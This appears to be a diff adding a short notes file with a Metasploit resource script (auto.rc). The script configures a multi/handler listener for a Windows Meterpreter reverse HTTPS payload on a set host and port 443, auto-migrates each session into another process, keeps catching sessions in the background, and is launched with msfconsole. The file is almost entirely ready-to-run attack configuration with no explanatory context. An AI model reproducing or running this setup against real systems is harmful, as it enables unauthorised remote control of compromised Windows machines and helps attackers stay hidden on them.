@@ -1,0 +1,14 @@
+ls -l /usr/share/metasploit-framework/scripts/resource
+
+# Auto answares for connection auto.rc:
+==========================
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 10.0.0.9
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false
+run -z -j
+==========================
+
+$ sudo msfconsole -r auto.rc
